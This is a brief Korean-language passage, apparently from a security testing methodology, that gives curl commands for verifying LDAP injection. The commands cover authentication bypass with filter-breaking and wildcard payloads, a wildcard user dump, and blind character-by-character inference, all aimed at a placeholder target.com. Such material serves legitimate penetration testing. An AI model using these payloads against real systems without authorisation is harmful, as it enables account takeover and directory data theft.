### Phase 2: 동적 테스트 (검증)


**인증 우회 테스트:**
```
# 와일드카드로 패스워드 조건 무효화
curl -X POST "https://target.com/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin)(|(uid=*","password":"anything"}'

# 또는 URL-encoded
curl -X POST "https://target.com/login" \
  -d "username=admin%29%28%7C%28uid%3D%2A&password=anything"

# 와일드카드 패스워드
curl -X POST "https://target.com/login" \
  -d "username=admin&password=*"
```

**정보 유출 테스트:**
```
# 모든 사용자 조회: * 와일드카드
curl "https://target.com/api/users/search?q=*"

# OR 조건 삽입
curl "https://target.com/api/users/search?q=admin)(|(uid=*)"
```

**Blind LDAP Injection 테스트:**
```
# 첫 글자 추론: a* vs b* (응답 차이 비교)
curl -X POST "https://target.com/login" -d "username=a*&password=*"
curl -X POST "https://target.com/login" -d "username=b*&password=*"
```

**검증 기준:**
- **확인됨**: 동적 테스트로 LDAP 필터 조작을 통해 인증 우회나 의도하지 않은 데이터 반환이 확인됨
